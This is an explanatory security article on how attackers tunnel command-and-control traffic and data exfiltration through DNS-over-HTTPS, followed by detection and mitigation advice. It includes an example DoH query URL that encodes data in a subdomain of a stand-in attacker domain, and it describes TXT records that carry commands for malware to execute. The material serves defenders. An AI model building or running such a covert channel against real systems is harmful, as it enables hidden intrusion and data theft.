Abusing DNS-over-HTTPS for C2 Communication

This article examines how threat actors manipulate DNS-over-HTTPS (DoH) to establish stealthy, encrypted command-and-control (C2) communication channels. By routing malicious DNS queries through legitimate, encrypted HTTPS tunnels directed at trusted public resolvers, adversaries can bypass traditional network inspection tools, mask malicious endpoints, and maintain covert channels within compromised environments.

The Mechanism of DNS-over-HTTPS (DoH)

Traditional DNS transmits domain lookups in cleartext over UDP or TCP port 53. Because it lacks encryption, security defenses—such as firewalls, intrusion detection systems (IDS), and deep packet inspection (DPI) engines—routinely monitor, log, or sinkhole malicious DNS queries.

DoH alters this paradigm by encrypting standard DNS queries within standard HTTP/2 or HTTP/3 sessions protected by Transport Layer Security (TLS) over port 443. Instead of sending requests to a local or ISP-assigned resolver, the client queries public DoH resolvers (such as Cloudflare, Google, or Quad9) using standard HTTPS transactions (GET or POST requests).

How Attackers Exploit DoH for C2

Adversaries leverage the core properties of DoH to construct bidirectional covert channels:

1. Infiltration and Exfiltration Through Encoded Subdomains

To transmit data from the infected host (data exfiltration or heartbeat messages), malware encodes information into subdomains prepended to an attacker-controlled root domain.

  • The malware formats data (using Base64, Hex, or custom encryption) into a request: dGhpcyBpcyBkYXRh.c2.attackerdomain.com.
  • Instead of querying standard port 53, the payload packages this lookup into a DoH query sent to a public resolver:
    https://cloudflare-dns.com/dns-query?name=dGhpcyBpcyBkYXRh.c2.attackerdomain.com&type=TXT
  • The public resolver decrypts the request, resolves the domain by querying the attacker's authoritative name server, and retrieves the response.

2. Issuing C2 Commands via DNS Records

To deliver commands to the host, the attacker configures their authoritative name server to respond with specific resource records:

  • TXT Records: Often used to send Base64-encoded scripts, shell commands, or payloads back to the client due to their higher data capacity.
  • A or AAAA Records: Used for simpler signaling, such as operational status codes, sleep intervals, or IP addresses of secondary staging servers.
  • CNAME Records: Alternative methods for chaining queries and pushing variable lengths of instructions.

The resolver returns the encrypted response over HTTPS back to the infected host, where the malware parses and executes the received instructions.

Operational Advantages for Adversaries

  • Traffic Blending: DoH traffic uses port 443 and the same TLS mechanisms as legitimate web browsing. Distinguishing malicious DoH queries from regular web activity is extremely difficult without deep TLS decryption.
  • Masking Infrastructure: Network logs on the victim's host only show outward connections to reputable IPs belonging to major public DNS providers. The attacker's true C2 server IP address remains hidden behind the recursive resolver hierarchy.
  • Bypassing DNS Firewalls: Standard DNS monitoring solutions that only capture port 53 traffic are completely blind to DoH payloads. Host-based DNS filtering is also circumvented if the malware incorporates its own hardcoded DoH client rather than relying on the operating system’s DNS configuration.

Detection and Mitigation Strategies

Organizations can implement targeted defenses to limit the effectiveness of DoH-based C2 operations:

  • Restricting External DoH Resolvers: Block outbound HTTPS traffic to known public DoH endpoints at the perimeter firewall and enforce internal enterprise resolvers via Group Policy or Mobile Device Management (MDM).
  • TLS Inspection: Implement active TLS/SSL decryption to inspect the paths, headers, and payloads of outbound HTTPS requests directed toward external web services.
  • Behavioral and Statistical Analysis: Analyze outbound connection metrics. Even when encrypted, DoH C2 channels often display distinct patterns, such as repetitive request intervals (beaconing), abnormal session durations, and unusually high packet volumes relative to normal DNS traffic.
